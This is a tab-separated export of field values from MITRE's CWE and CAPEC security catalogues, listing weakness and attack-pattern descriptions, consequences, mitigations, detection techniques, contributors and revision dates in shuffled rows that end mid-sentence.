17816	62	updated Relationships, Taxonomy_Mappings
7890	28	CWE Content Team
24280	53	The MITRE Corporation
14672	61	Draft
19056	62	updated Relationships, Taxonomy_Mappings
7133	60	28
15985	35	MITRE
16507	62	updated Common_Consequences
22674	35	MITRE
12448	35	MITRE
20284	63	Read Memory
6513	88	Mismatched Memory Management Routines
5692	31	699
5839	28	CWE Content Team
20158	28	CWE Content Team
11302	91	Architecture and Design
21661	33	Steve Christey
9476	69	Incomplete
9780	45	Variant
20589	91	Implementation
20789	28	CWE Content Team
8885	28	CWE Content Team
18966	35	Cigital
21095	28	CWE Content Team
7314	56	ChildOf
11186	35	MITRE
24687	99	Addison-Wesley
8887	62	updated Common_Consequences
17671	28	CWE Content Team
23965	80	Ability to generate and inject false data into operational data into a system with the intent of causing the victim to alter the configuration of the system.
7488	56	ChildOf
12175	50	Implementation: Execute program in less trusted process space environment, do not allow lower integrity processes to write to higher integrity processes
21092	85	301
7764	69	Draft
25162	39	2008-07-01
7798	39	2017-01-19
8060	40	Filtering is performed on data that has not be properly canonicalized.
8596	81	Confidentiality
9952	62	updated Maintenance_Notes, Other_Notes, Relationships
10338	62	updated Relationships, Taxonomy_Mappings
22627	76	2019-04-04
7502	42	Check return values to ensure locking operations are successful.
17747	42	Use a vetted library or framework that does not allow this weakness to occur or provides constructs that make this weakness easier to avoid.                   For example, consider using libraries with authentication capabilities such as OpenSSL or the ESAPI Authenticator [REF-45].
6845	23	The software transmits sensitive or security-critical data in cleartext in a communication channel that can be sniffed by unauthorized actors.
16218	39	2019-09-19
8479	26	Implementation
22152	28	CWE Content Team
19444	35	MITRE
14768	62	updated Common_Consequences
17691	35	MITRE
22923	91	Implementation
23449	28	Eric Dalci
15880	91	Architecture and Design
19129	44	High
8823	56	ChildOf
7664	23	An adversary uses radio noise or signals in an attempt to disrupt communications. By intentionally overwhelming system resources with illegitimate traffic, service is denied to the legitimate traffic of authorized users.
7027	43	Simple
20845	90	Interpreted
6641	91	Implementation
14695	67	Medium
23134	79	Confidentiality
21025	28	CWE Content Team
22737	23	An attacker targets mobile phone users with a phishing attack for the purpose of soliciting account passwords or sensitive information from the user. Mobile Phishing is a variation on the Phishing social engineering technique where the attack is initiated via mobile texting rather than email. The user is enticed to provide information or go to a compromised web site via a text message. Apart from the manner in which the attack is initiated, the attack proceeds as a standard Phishing attack.
7750	62	updated Demonstrative_Examples, Relationships, Taxonomy_Mappings
16694	39	2011-06-27
23549	104	114
13292	80	Directory traversal
14478	53	The MITRE Corporation
13234	66	Limiting buffer overflows with ExecShield
22735	91	Architecture and Design
14471	66	Apache CXF Security Advisory (CVE-2010-2076)
11177	59	Updated Related_Attack_Patterns
20982	39	2010-04-05
8626	28	CWE Content Team
23350	100	The MITRE Corporation
23277	28	CWE Content Team
19180	35	MITRE
9795	81	Confidentiality
12923	62	updated Relationships, Taxonomy_Mappings
15555	28	CWE Content Team
24450	23	An adversary consumes the resources of a target by rapidly engaging in a large number of interactions with the target. This type of attack generally exposes a weakness in rate limiting or flow. When successful this attack prevents legitimate users from accessing the service and can cause the target to crash. This attack differs from resource depletion through leaks or allocations in that the latter attacks do not rely on the volume of requests made to the target but instead focus on manipulation of the target's operations. The key factor in a flooding attack is the number of requests the adversary can make in a given period of time. The greater this number, the more likely an attack is to succeed against a given target.
23103	35	MITRE
12180	39	2010-12-13
12112	31	1000
24429	39	2010-09-27
21680	23	An attacker spoofs a UDDI, ebXML, or similar message in order to impersonate a service provider in an e-business transaction. UDDI, ebXML, and similar standards are used to identify businesses in e-business transactions. Among other things, they identify a particular participant, WSDL information for SOAP transactions, and supported communication protocols, including security protocols. By spoofing one of these messages an attacker could impersonate a legitimate business in a transaction or could manipulate the protocols used between a client and business. This could result in disclosure of sensitive information, loss of message integrity, or even financial fraud.
6277	77	Architecture or Design Review
11571	47	Modify Data
18536	35	MITRE
17456	35	MITRE
16945	39	2012-10-30
21052	28	CWE Content Team
15731	28	CWE Content Team
23871	63	Gain Privileges or Assume Identity
21897	52	According to SOAR, the following detection techniques may be useful:                                         Highly cost effective:                                                                           Focused Manual Spotcheck - Focused manual analysis of source                            Manual Source Code Review (not inspections)
22570	62	updated Background_Details, Description
17860	39	2014-07-30
12568	103	Primary
6905	60	09
21875	72	Information exposure.
19411	35	MITRE
7970	100	The MITRE Corporation
14763	103	Primary
15045	89	Detailed
19264	103	Primary
16422	40	The adversary must convince the victim into performing the decoy action.
10914	81	Integrity
16814	81	Integrity
19958	77	Architecture or Design Review
17904	62	updated Demonstrative_Examples, Potential_Mitigations
12511	35	MITRE
25113	92	Explore
14845	62	updated Relationships, Taxonomy_Mappings, Weakness_Ordinalities
17354	31	699
25181	39	2010-06-21
9997	100	The MITRE Corporation
24071	103	Primary
24368	45	Class
18508	95	[Probe identified potential entry points for XSS vulnerability] The attacker uses the entry points gathered in the "Explore" phase as a target list and injects various common script payloads to determine if an entry point actually represents a vulnerability and to characterize the extent to which the vulnerability can be exploited.
6809	89	Standard
22563	39	2014-07-30
21395	39	2014-02-18
19173	35	MITRE
22356	39	2009-03-10
11952	91	Requirements
15873	73	Use a browser to manually explore the website and analyze how it is constructed. Many browsers' plugins are available to facilitate the analysis or automate the discovery.
5740	35	MITRE
8409	96	2013-07-02
21448	62	updated Applicable_Platforms, Likelihood_of_Exploit
20872	62	updated Relationships, Other_Notes, Taxonomy_Mappings, Weakness_Ordinalities
22254	28	CWE Content Team
21558	39	2019-06-20
5783	39	2011-06-27
16953	39	2015-12-07
10353	91	Build and Compilation
19638	39	2009-07-27
6191	39	2014-07-30
12418	47	Other
17617	28	CWE Content Team
8321	35	MITRE
5865	50	Implementation: use validation on both client and server side.
20259	35	MITRE
13199	62	updated Relationships
13933	35	Cigital
24180	40	Input filtering and validating is not done properly leaving the door open to harmful characters for the target host.
17538	101	CAPEC Content Team
19906	63	Alter Execution Logic
6408	39	2012-05-11
8571	39	2012-05-11
10527	62	updated Demonstrative_Examples, Relationships, Taxonomy_Mappings
19177	104	537
10008	62	updated Time_of_Introduction
18595	51	2014-06-23
19982	85	278
23260	35	MITRE
25423	55	CAPEC Content Team
19874	43	Simple
8125	91	Operation
22678	28	CWE Content Team
22018	91	Implementation
11918	79	Access Control
14969	76	2015-12-07
11873	47	Execute Unauthorized Commands
7740	39	2009-07-27
6215	62	Suggested OWASP Top Ten 2004 mapping
13659	39	2012-10-30
9385	39	2008-07-01
13752	63	Bypass Protection Mechanism
6631	35	MITRE
21492	39	2014-07-30
23927	31	1000
20560	39	2014-07-30
18212	62	updated Relationships, Taxonomy_Mappings
15072	35	MITRE
14860	103	Primary
22332	28	CWE Content Team
21411	28	CWE Content Team
15835	35	MITRE
24641	33	Yves Younan
10346	35	MITRE
17882	62	updated Potential_Mitigations
18453	43	Simple
5711	77	Automated Dynamic Analysis
7606	62	updated Related_Attack_Patterns, Relationships
13793	33	Paul F. Roberts
7936	62	updated Demonstrative_Examples
24907	42	Use dynamic tools and techniques that interact with the software using large test suites with many diverse inputs, such as fuzz testing (fuzzing), robustness testing, and fault injection. The software's operation may slow down, but it should not become unstable, crash, or generate incorrect results.
14887	53	The MITRE Corporation
22465	81	Confidentiality
13449	95	[Observe the outcome] Observe the outputs to the inputs fed into the system by fuzzers and see if anything interesting happens. If failure occurs, determine why that happened. Figure out the underlying assumption that was invalidated by the input.
15257	62	updated Applicable_Platforms, Demonstrative_Examples, Relationships, Taxonomy_Mappings
20637	39	2008-09-08
9357	101	CAPEC Content Team
9024	28	CWE Content Team
24472	62	updated Applicable_Platforms, Modes_of_Introduction, References, Relationships
20619	90	Language-Independent
8490	102	ChildOf
18680	56	ChildOf
6057	72	Injected code can access resources that the attacker is directly prevented from accessing.
20777	31	1000
13991	35	MITRE
9484	34	OMISSION: This weakness is caused by missing a security tactic during the architecture and design phase.
21985	39	2019-09-23
22255	39	2019-09-19
21940	31	1000
21654	95	The attacker crafts a malicious URL string request and sends it to the server.
19923	40	The application server accepts paths to locate resources.
17955	33	David LeBlanc
23142	21	Anonymous Tool Vendor (under NDA)
13260	103	Primary
14870	62	updated Taxonomy_Mappings
16409	35	MITRE
20687	100	The MITRE Corporation
6405	78	Medium
22541	69	Draft
24446	28	CWE Content Team
7829	39	2012-05-11
17518	28	CWE Content Team
10667	62	updated Relationships
17260	89	Meta
20143	35	MITRE
25403	31	1000
24064	74	2
5987	39	2008-09-08
19457	35	MITRE
13565	45	Base
11662	104	168
15498	39	2017-11-08
22886	35	MITRE
23470	46	When techniques such as machine learning are used to automatically classify input streams, and those classifications are used for security-critical decisions, then any mistake in classification can introduce a vulnerability that allows attackers to cause the product to make the wrong security decision.  If the automated mechanism is not developed or "trained" with enough input data, then attackers may be able to craft malicious input that intentionally triggers the incorrect classification.             Targeted technologies include, but are not necessarily limited to:                             automated speech recognition                automated image recognition                          For example, an attacker might modify road signs or road surface markings to trick autonomous vehicles into misreading the sign/marking and performing a dangerous action.
11838	79	Confidentiality
13699	89	Detailed
12141	79	Authorization
10764	39	2008-09-08
7131	39	2014-07-30
13730	80	Adversaries can often purchase low-cost technology to implement rogue access points.
12714	28	CWE Content Team
17161	81	Integrity
17463	56	ChildOf
10681	39	2010-02-16
10067	74	2
21807	36	https://blog.lookout.com/look-10-007-tapjacking/
7056	79	Availability
12086	89	Standard
8168	62	updated Relationships
18197	39	2017-11-08
15591	62	updated Relationships
16173	55	CAPEC Content Team
5717	23	The code contains a callable, block, or other code element in      which the same variable is used to control more than one unique task or store      more than one instance of data.
11243	31	1000
23678	62	updated Other_Notes, Potential_Mitigations
18037	81	Other
15025	81	Confidentiality
24141	81	Integrity
11126	94	Run Arbitrary Code
15793	35	MITRE
19322	44	SOAR Partial
21631	35	MITRE
22309	39	2014-07-30
19767	42	Inputs should be decoded and canonicalized to the application's current internal representation before being validated (CWE-180). Make sure that the application does not decode the same input twice (CWE-174). Such errors could be used to bypass whitelist validation schemes by introducing dangerous inputs after they have been checked.
19466	62	updated Other_Notes
12022	74	3
15549	26	Architecture and Design
9009	91	Requirements
18369	77	Black Box
9958	62	updated Relationships, Other_Notes, Taxonomy_Mappings
16628	62	updated References, Relationships
9719	39	2008-09-08
9229	94	Run Arbitrary Code
17674	39	2011-06-01
7968	91	Operation
9625	39	2017-11-08
19644	56	ChildOf
11923	28	CWE Content Team
16959	39	2014-07-30
14199	23	Fault injection attacks against mobile devices use disruptive signals or events (e.g. electromagnetic pulses, laser pulses, clock glitches, etc.) to cause faulty behavior. When performed in a controlled manner on devices performing cryptographic operations, this faulty behavior can be exploited to derive secret key information. Although this attack usually requires physical control of the mobile device, it is non-destructive, and the device can be used after the attack without any indication that secret keys were compromised.
21925	43	Chain
10319	35	MITRE
9436	51	2015-11-09
11642	23	The code contains a function or method that    operates in a multi-threaded environment but owns an unsafe non-final                        static storable or member data element.
6442	62	updated Relationships, Taxonomy_Mappings
19300	62	updated Common_Consequences
18169	28	CWE Content Team
13147	62	updated Time_of_Introduction
12136	62	updated Demonstrative_Examples, Taxonomy_Mappings
17329	43	Simple
15379	50	An organization should provide regular, robust cybersecurity training to its employees to prevent social engineering attacks.
16553	103	Primary
5968	35	MITRE
23841	91	Installation
20269	62	updated Common_Consequences
6181	103	Primary
12808	28	Eric Dalci
21740	39	2008-10-14
6405	97	IMAP/SMTP Command Injection
14948	39	2011-06-01
22359	28	CWE Content Team
11905	62	updated Description, Maintenance_Notes, Name
23160	35	MITRE
19483	31	699
10332	63	DoS: Resource Consumption (Other)
23787	35	MITRE
9350	39	2011-06-01
5906	35	MITRE
6585	39	2012-05-11
20707	51	2014-06-23
16218	35	MITRE
24292	79	Access Control
22361	72	Potentially a program could fail if it needs more arguments then are available.
19742	52	According to SOAR, the following detection techniques may be useful:                                         Cost effective for partial coverage:                                                                           Host-based Vulnerability Scanners – Examine configuration for flaws, verifying that audit mechanisms work, ensure host configuration meets certain predefined criteria
6053	35	MITRE
18840	28	CWE Content Team
23990	28	CWE Content Team
8679	28	CWE Content Team
14101	104	1043
6418	102	ChildOf
18852	73	The attacker uses fuzzing tools to send random malformed messages to web server and observes for server's log or error message.
18496	101	CAPEC Content Team
6743	89	Standard
19449	31	699
13569	35	MITRE
12282	100	The MITRE Corporation
24445	73	Steal cookie via a cross-site scripting attack.
24780	69	Incomplete
8673	92	Experiment
23137	77	Automated Static Analysis
10617	23	An attacker forces the encryption level to be lowered, thus enabling a successful attack against the encrypted data.
11493	62	updated Demonstrative_Examples, Relationships
21567	100	The MITRE Corporation
23490	39	2017-11-08
13421	42	Since any attacker who can listen to traffic can see sequence numbers, it is necessary to sign messages with some kind of cryptography to ensure that sequence numbers are not simply doctored along with content.
22024	39	2008-09-08
9794	63	Modify Memory
11827	35	MITRE
20366	63	Gain Privileges or Assume Identity
23049	91	Implementation
11450	28	CWE Content Team
14016	91	Testing
22753	39	2008-07-01
12150	56	ChildOf
7621	63	Unexpected State
7165	62	updated Relationships
14846	35	MITRE
5820	88	Improper Restriction of Names for Files and Other Resources
21452	62	updated Alternate_Terms, Applicable_Platforms, Common_Consequences, Demonstrative_Examples, Name, Other_Notes, Potential_Mitigations, References, Related_Attack_Patterns, Relationship_Notes, Relationships, Type, Weakness_Ordinalities
25426	76	2019-04-04
19939	73	Induce errors to find informative error messages
13595	62	updated Potential_Mitigations
13002	35	MITRE
6544	86	http://o2platform.files.wordpress.com/2011/07/ounce_springframework_vulnerabilities.pdf
12707	26	Architecture and Design
14627	56	ChildOf
10204	79	Availability
10313	39	2012-05-11
18127	72	Depending on the logical circumstances involved, any consequences may result: e.g., issues of confidentiality, authentication, authorization, availability, integrity, accountability, or non-repudiation.
19587	62	updated Potential_Mitigations
11154	62	updated Description, Name, Relationships
9975	62	updated Relationships
20349	42	Avoid using cookie data for a security-related decision.
12652	62	updated Common_Consequences, Demonstrative_Examples, Potential_Mitigations, References, Related_Attack_Patterns, Relationships
16187	35	MITRE
5915	23	The software generates a hash for a password, but it uses a scheme that does not provide a sufficient level of computational effort that would make password cracking attacks infeasible or expensive.
11530	39	2014-07-30
10007	39	2013-07-17
13520	35	MITRE
6559	28	CWE Content Team
13522	35	MITRE
6605	31	1000
8617	60	06
8345	89	Detailed
11993	100	The MITRE Corporation
23716	39	2017-01-19
23663	28	CWE Content Team
8933	28	CWE Content Team
6603	62	updated Relationships, Taxonomy_Mappings
9503	74	1
7559	39	2009-10-29
18944	62	updated Demonstrative_Examples
9439	28	CWE Content Team
21562	86	https://buildsecurityin.us-cert.gov/daisy/bsi/articles/knowledge/principles/352.html
7017	67	High
13884	77	Architecture or Design Review
23243	101	CAPEC Content Team
8153	39	2017-05-03
11764	62	updated Potential_Mitigations, Relationships
13393	35	MITRE
14958	26	Architecture and Design
19947	42	Use a tool that dynamically detects memory management problems, such as valgrind.
10273	78	Medium
23264	39	2008-08-15
11597	30	Defense Advanced Research Projects Agency Information Processing Techniques Office
17196	39	2019-06-20
12164	47	Resource Consumption
17955	99	Microsoft Press
13801	55	CAPEC Content Team
22639	35	MITRE
18387	35	MITRE
20482	35	MITRE
22073	62	updated Common_Consequences
20891	23	The product does not sufficiently enforce boundaries between the states of different sessions, causing data to be provided to, or used by, the wrong session.
14027	35	MITRE
13998	46	The J2EE standard permits the use of sockets only for the purpose of communication with legacy systems when no higher-level protocol is available. Authoring your own communication protocol requires wrestling with difficult security issues.             Without significant scrutiny by a security expert, chances are good that a custom communication protocol will suffer from security problems. Many of the same issues apply to a custom implementation of a standard protocol. While there are usually more resources available that address security concerns related to implementing a standard protocol, these resources are also available to attackers.
21006	103	Primary
17607	35	MITRE
21677	74	4
22124	53	The MITRE Corporation
15949	89	Standard
11597	36	http://www.faqs.org/rfcs/rfc793.html
9763	28	CWE Content Team
13499	62	updated Relationships, Taxonomy_Mappings
13918	44	SOAR Partial
24711	35	MITRE
19852	62	updated Description, Name
8060	50	Ensure that filtering or input validation is applied to canonical data.
13486	35	MITRE
12950	62	updated Potential_Mitigations, Time_of_Introduction
16822	50	This attack may be mitigated by enforcing rules at the router following the guidance of RFC1858. The essential part of the guidance is creating the following rule "IF FO=1 and PROTOCOL=TCP then DROP PACKET" as this mitigated both tiny fragment and overlapping fragment attacks in IPv4. In IPv6 overlapping(RFC5722) additional steps may be required such as deep packet inspection. The delayed fragments may be mitigated by enforcing a timeout on the transmission to receive all packets by a certain time since the first packet is received. According to RFC2460 IPv6 implementations should enforce a rule to discard all fragments if the fragments are not ALL received within 60 seconds of the FIRST arriving fragment.
13458	39	2011-06-01
20892	28	CWE Content Team
13573	79	Confidentiality
12783	103	Primary
19558	101	CAPEC Content Team
12606	28	CWE Content Team
19319	35	MITRE
20392	28	CWE Content Team
7838	85	89
7532	62	updated Potential_Mitigations
7106	62	updated Detection_Factors, Relationships, Taxonomy_Mappings
6397	39	2008-08-15
9487	39	2012-05-11
16374	31	1000
6697	90	C
16969	31	1000
7392	34	This is an implementation error, in which the algorithm/technique requires certain security-related behaviors or conditions that are not implemented or checked properly, thus causing a vulnerability.
21178	52	According to SOAR, the following detection techniques may be useful:                                         Cost effective for partial coverage:                                                                           Source code Weakness Analyzer                            Context-configured Source Code Weakness Analyzer
11142	102	ChildOf
21666	43	Simple
22384	62	updated Potential_Mitigations
21370	28	CWE Content Team
16116	26	Architecture and Design
6946	28	CWE Content Team
22667	35	MITRE
13572	63	Modify Files or Directories
24578	63	Gain Privileges or Assume Identity
8262	39	2008-09-08
6977	63	Gain Privileges or Assume Identity
21307	33	Pieter Philippaerts
20696	62	updated Relationships
8872	102	ChildOf
20304	103	Primary
11311	39	2012-05-11
10139	43	Simple
11041	23	The software contains a finalize() method that does not call super.finalize().
12120	40	Adversary has the capability to influence the input to buffer operations.
7992	39	2010-06-21
10004	62	updated Modes_of_Introduction, Relationships
19488	47	Execute Unauthorized Commands
12542	42	If the number to be used is always expected to be positive, change the variable type from signed to unsigned or size_t.
18671	39	2009-10-29
25056	28	CWE Content Team
17102	39	2008-07-01
10957	35	MITRE
20146	28	CWE Content Team
21305	91	Implementation
22103	85	28
11180	71	2014
17339	28	CWE Content Team
15384	59	Updated Attack_Motivation-Consequences, Attack_Prerequisites, Description Summary, Solutions_and_Mitigations, Typical_Likelihood_of_Exploit, Typical_Severity
10915	62	updated Time_of_Introduction
20206	62	updated Relationships
13579	32	DNSSEC
13419	39	2008-09-08
24425	102	ChildOf
6643	100	The MITRE Corporation
16215	51	2014-06-23
7389	101	CAPEC Content Team
19637	81	Confidentiality
17100	89	Standard
17173	28	CWE Content Team
6742	59	Updated Related_Weaknesses
7363	89	Detailed
21910	102	ChildOf
18648	35	MITRE
13770	57	Primary
20417	74	3
21646	58	Final provides security by only allowing non-mutable objects to be changed after being set. However, only objects which are not extended can be made final.
9130	76	2018-07-31
9306	28	CWE Content Team
13330	39	2011-06-27
19646	35	MITRE
19822	103	Primary
24421	28	CWE Content Team
7683	101	CAPEC Content Team
6795	28	Eric Dalci
7087	62	updated Related_Attack_Patterns, Relationships
11289	45	Variant
8385	62	updated Common_Consequences
7880	21	PLOVER
20350	63	Execute Unauthorized Code or Commands
15615	23	A public or protected static final field references a mutable object, which allows the object to be changed by malicious code, or accidentally from another package.
24899	91	Architecture and Design
21265	39	2017-11-08
25307	103	Primary
22977	56	ChildOf
15121	43	Simple
10798	63	Gain Privileges or Assume Identity
17337	60	08
7344	62	updated Time_of_Introduction
8416	42	Perform access control checks and limit which entities can access the feature that requires the hard-coded password. For example, a feature might only be enabled through the system console instead of through a network connection.
21948	77	Fuzzing
16245	31	1000
24317	28	CWE Content Team
23608	53	The MITRE Corporation
12812	62	updated Relationships
10382	74	2
9842	69	Draft
5860	35	MITRE
13276	62	updated References
13480	53	The MITRE Corporation
13669	35	MITRE
8156	28	CWE Content Team
12960	35	MITRE
16988	39	2008-07-01
5588	61	Draft
8307	61	Draft
15218	23	The product violates well-established principles for secure design.
7255	62	updated Potential_Mitigations
5880	28	CWE Content Team
7808	72	The resource in question, or other resources (through the corrupted one), may be changed in undesirable ways by a malicious user.
7304	96	2017-07-24
15861	62	updated Relationships
12713	67	High
22619	35	MITRE
12246	59	Updated Attack_Phases
19646	28	CWE Content Team
14361	100	The MITRE Corporation
9139	35	MITRE
20053	103	Primary
7307	49	2010
7788	39	2011-06-27
12832	35	Cigital
12973	39	2011-06-01
11296	62	updated Potential_Mitigations
18332	21	CWE Content Team
14126	31	1000
7268	44	High
16904	79	Confidentiality
12773	62	updated Relationships
15245	91	Testing
24515	28	CWE Content Team
19100	39	2019-09-19
10646	23	A software system that accepts input in the form of a slash absolute path ('/absolute/pathname/here') without appropriate validation can allow an attacker to traverse the file system to unintended locations or access arbitrary files.
11388	35	MITRE
24920	39	2011-06-01
16488	35	MITRE
22587	70	Slowris HTTP DoS
12920	90	C
19732	39	2008-07-01
10387	39	2015-12-07
21360	28	CWE Content Team
5820	67	Low
11689	101	CAPEC Content Team
10248	62	updated Background_Details, Other_Notes
13746	28	CWE Content Team
23704	35	MITRE
17553	39	2010-12-13
23427	89	Meta
6513	90	C
14109	91	Architecture and Design
15839	28	CWE Content Team
21218	35	MITRE
19031	31	1000
11916	39	2012-10-30
23376	91	Implementation
18598	56	ChildOf
23108	72	Common data types that are attacked are environment variables, web application parameters, and HTTP headers.
9926	101	CAPEC Content Team
18994	62	updated Common_Consequences, Relationships, Observed_Example
15477	62	updated Relationships
23145	55	CAPEC Content Team
19484	35	MITRE
22908	62	updated Demonstrative_Examples, Name, Related_Attack_Patterns
8856	35	MITRE
19448	73	Leveraging one of the vulnerable inputs identified during the Experiment phase, inject malicious XQuery payload. The payload aims to get information on the structure of the underlying XML database and/or the content in it.
9688	35	MITRE
18348	34	COMMISSION: This weakness refers to an incorrect design related to an architectural security tactic.
21774	28	CWE Content Team
9762	91	Implementation
15490	27	While simple fingerprinting can be accomplished with only a web browser, for more thorough fingerprinting an attacker requires a variety of tools to collect information about the target. These tools might include protocol analyzers, web-site crawlers, and fuzzing tools. Footprinting a service adequately may also take a few days if the attacker wishes the footprinting attempt to go undetected.
19758	28	CWE Content Team
9625	35	MITRE
20645	52	According to SOAR, the following detection techniques may be useful:                                         Cost effective for partial coverage:                                                                           Source code Weakness Analyzer                            Context-configured Source Code Weakness Analyzer
7337	31	1000
19576	39	2008-11-24
17444	79	Confidentiality
17819	28	Eric Dalci
9232	35	MITRE
8223	33	Chris Wysopal
23587	31	1000
17939	28	CWE Content Team
15086	62	updated Demonstrative_Examples
19068	39	2009-05-27
23001	68	This is not a complete solution, since many buffer overflows are not related to strings.
24292	79	Confidentiality
17493	81	Availability
22911	35	MITRE
23988	62	updated Potential_Mitigations, Time_of_Introduction
17334	56	ChildOf
15283	78	High
18185	28	CWE Content Team
6253	81	Integrity
25325	62	updated Relationships, Taxonomy_Mappings
14070	23	The software establishes a communication channel to handle an incoming request that has been initiated by an actor, but it does not properly verify that the request is coming from the expected origin.
14888	43	Simple
25273	88	Serializable Data Element Containing non-Serializable Item Elements
14356	92	Explore
15697	79	Access Control
8149	62	updated Related_Attack_Patterns
16623	95	[Determine application's/system's password policy] Determine the password policies of the target application/system.
21270	39	2014-07-30
23046	39	2012-05-11
10776	28	CWE Content Team
13255	35	Cigital
17977	35	MITRE
11796	88	Uncontrolled Resource Consumption
13313	40	This attack pattern requires knowledge of where important system resources are logically located as well as how they operate.
14319	94	Blocking a resource from functional operation denies its availability to authorized users.
12711	31	1000
21556	102	CanFollow
9286	63	Read Files or Directories
14988	21	PLOVER
21920	80	Development skills to construct malicious attachments that can be used to exploit vulnerabilities in typical desktop applications or system configurations. The malicious attachments should be crafted well enough to bypass typical defensive systems (IDS, anti-virus, etc)
11374	79	Integrity
7481	59	Updated References
9530	81	Other
6041	100	The MITRE Corporation
11655	55	CAPEC Content Team
10258	81	Other
22104	44	High
11325	56	ChildOf
12845	102	ChildOf
15389	28	CWE Content Team
13615	103	Primary
10394	28	Eric Dalci
6304	103	Primary
20730	74	3
15942	76	2019-04-04
25279	62	updated Likelihood_of_Exploit, Modes_of_Introduction, References, Relationships, Taxonomy_Mappings
13577	35	MITRE
16318	66	Basic Integer Overflows
10386	62	updated Common_Consequences
14002	61	Draft
16705	81	Confidentiality
14926	39	2012-10-30
17604	35	Veracode
16960	36	http://www.social-engineer.org
23171	91	Implementation
24587	74	1
15989	35	MITRE
17601	33	ShAnKaR
20814	89	Detailed
24902	39	2012-10-30
7637	79	Availability
19736	35	MITRE
9013	28	CWE Content Team
7117	35	MITRE
21712	35	MITRE
22140	85	92
18894	62	updated Applicable_Platforms
10938	53	The MITRE Corporation
22091	39	2009-05-27
14948	28	CWE Content Team
21960	39	2012-10-30
20318	23	Non-replicating malicious code only resides on the target system or software that is attacked; it does not attempt to spread to other systems.
22968	62	updated Relationships
12630	63	Modify Memory
18946	47	Bypass Protection Mechanism
23014	62	updated Potential_Mitigations
19614	62	updated Description, Name, Observed_Examples, Potential_Mitigations
21122	42	Avoid complex security mechanisms when simpler ones would meet requirements. Avoid complex data models, and unnecessarily complex operations. Adopt architectures that provide guarantees, simplify understanding through elegance and abstraction, and that can be implemented similarly. Modularize, isolate and do not trust complex code, and apply other secure programming principles on these modules (e.g., least privilege) to mitigate vulnerabilities.
7197	103	Primary
7565	55	CAPEC Content Team
16154	28	CWE Content Team
17375	62	updated Potential_Mitigations, Time_of_Introduction
19332	62	updated Relationships
17702	69	Incomplete
21291	100	The MITRE Corporation
22168	79	Confidentiality
12465	26	Implementation
7390	33	Daniel Genkin
21258	62	updated Other_Notes
14337	92	Exploit
17493	63	DoS: Resource Consumption (Memory)
7825	85	433
14872	61	Stable
7369	62	updated Time_of_Introduction
10431	28	CWE Content Team
7446	28	Eric Dalci
9371	35	MITRE
16845	86	https://blog.openai.com/adversarial-example-research/
9020	39	2011-06-01
6313	28	CWE Content Team
22039	79	Integrity
18896	62	updated Relationships, Taxonomy_Mappings
14030	81	Availability
20624	28	CWE Content Team
7196	21	7 Pernicious Kingdoms
14848	39	2017-11-08
24825	39	2008-07-01
6513	67	Low
21781	56	ChildOf
16227	45	Variant
5805	91	Implementation
12293	21	CWE Content Team
9646	53	The MITRE Corporation
18442	40	This attack requires the knowledge of the satellite's coordinates for targeting.
8279	62	updated Potential_Mitigations
23717	50	Design: For interactive user applications, consider if direct file system interface is necessary, instead consider having the application proxy communication.
12864	36	http://www.php.net/manual/en/security.globals.php
6228	39	2010-06-21
8616	63	Hide Activities
17277	35	MITRE
13103	39	2014-07-30
14441	42	Run the code in an environment that performs automatic taint propagation and prevents any command execution that uses tainted variables, such as Perl's "-T" switch. This will force the program to perform validation steps that remove the taint, although you must be careful to correctly validate your inputs so that you do not accidentally mark dangerous inputs as untainted (see CWE-183 and CWE-184).
25048	35	MITRE
11887	35	MITRE
24560	46	This issue can prevent the software from running reliably, e.g. by triggering an exeption.  If the relevant code is reachable by an attacker, then this reliability problem might introduce a vulnerability.   As examples, the serializable nature of a data element comes from a serializable SerializableAttribute attribute in .NET and the inheritance from the java.io.Serializable interface in Java.
6983	81	Confidentiality
20817	69	Incomplete
5982	72	The attacker might be able to use reflection to call the wrong code, possibly with unexpected arguments that violate the API (CWE-227). This could cause the application to exit or hang.
23465	45	Variant
8097	100	The MITRE Corporation
17038	56	ChildOf
14428	62	updated Relationships
11468	62	updated Common_Consequences
15821	62	updated Relationships
16740	56	ChildOf
7184	39	2011-06-01
11514	40	Advanced knowledge about the installed target system design.
22680	71	2002
12810	62	added/updated demonstrative examples
19276	62	updated Common_Consequences
16752	78	Low
22984	42	Very carefully manage the setting, management, and handling of privileges. Explicitly manage trust zones in the software.
19970	39	2014-07-30
16421	77	Automated Dynamic Analysis
8738	50	To mitigate this type of an attack, an organization can monitor incoming packets and look for patterns in the TCP traffic to determine if the network is under an attack. The potential target may implement a rate limit on TCP SYN messages which would provide limited capabilities while under attack.
14182	39	2011-06-01
11795	33	Daniel Gruss
7437	63	Gain Privileges or Assume Identity
22356	28	CWE Content Team
17127	42	Consider implementing a velocity check mechanism which would detect abusive behavior.
14402	62	updated Observed_Examples
13316	39	2012-05-11
11613	54	Medium
15419	77	Dynamic Analysis with Manual Results Interpretation
13672	21	CWE Content Team
16284	55	CAPEC Content Team
22827	35	Cigital
6140	26	Operation
9586	88	Embedded Malicious Code
21249	62	updated Applicable_Platforms, Detection_Factors, Potential_Mitigations, References, Relationships, Taxonomy_Mappings
11384	79	Confidentiality
17555	39	2011-06-27
20378	31	1000
15361	39	2010-06-21
5963	62	updated Potential_Mitigations, References
18442	78	High
15229	35	MITRE
12843	62	updated Demonstrative_Examples, Potential_Mitigations
15526	36	http://jeremiahgrossman.blogspot.com/2007/07/attribute-based-cross-site-scripting.html
5628	39	2008-07-01
7615	47	Bypass Protection Mechanism
8639	62	updated Applicable_Platforms
24310	62	updated Description, Name, Relationships
13622	28	CWE Content Team
25171	53	The MITRE Corporation
8731	42	Assume all input is malicious. Use an "accept known good" input validation strategy, i.e., use a whitelist of acceptable inputs that strictly conform to specifications. Reject any input that does not strictly conform to specifications, or transform it into something that does.                   When performing input validation, consider all potentially relevant properties, including length, type of input, the full range of acceptable values, missing or extra inputs, syntax, consistency across related fields, and conformance to business rules. As an example of business rule logic, "boat" may be syntactically valid because it only contains alphanumeric characters, but it is not valid if the input is only expected to contain colors such as "red" or "blue."                   Do not rely exclusively on looking for malicious or malformed inputs (i.e., do not rely on a blacklist). A blacklist is likely to miss at least one undesirable input, especially if the code's environment changes. This can give attackers enough room to bypass the intended validation. However, blacklists can be useful for detecting potential attacks or determining which inputs are so malformed that they should be rejected outright.                   When validating filenames, use stringent whitelists that limit the character set to be used. If feasible, only allow a single "." character in the filename to avoid weaknesses such as CWE-23, and exclude directory separators such as "/" to avoid CWE-36. Use a whitelist of allowable file extensions, which will help to avoid CWE-434.                   Do not rely exclusively on a filtering mechanism that removes potentially dangerous 